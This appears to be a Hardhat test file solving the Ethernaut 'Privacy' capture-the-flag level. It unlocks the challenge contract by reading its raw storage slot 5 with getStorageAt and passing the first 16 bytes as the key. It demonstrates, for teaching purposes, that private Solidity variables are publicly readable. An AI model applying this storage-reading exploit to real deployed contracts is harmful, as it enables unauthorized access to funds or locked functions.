// Goal
// Unlock the contract.

import { ContractFactory, Signer } from "ethers"
import { Privacy } from "../../typechain-types"
import { ethers } from "hardhat"
import { expect } from "chai"

// Solution
describe('Privacy', function () {
  let Privacy: ContractFactory
  let privacy: Privacy

  let signers: Signer[]
  let owner: Signer
  let attacker: Signer

  before(async function () {
    const data = [
      ethers.utils.formatBytes32String('value 1'), 
      ethers.utils.formatBytes32String('value 2'), 
      ethers.utils.formatBytes32String('value 3')
    ]

    Privacy = await ethers.getContractFactory('Privacy')
    privacy = (await Privacy.deploy(data)) as Privacy

    signers = await ethers.getSigners()
    owner = signers[0]
    attacker = signers[1]
  })

  it('Should unlock the contract', async function () {
    let data = await ethers.provider.getStorageAt(privacy.address, 5)
    data = data.slice(0, 2 + 16 * 2)
    await privacy.unlock(data)

    expect(await privacy.locked()).to.be.false
  })
})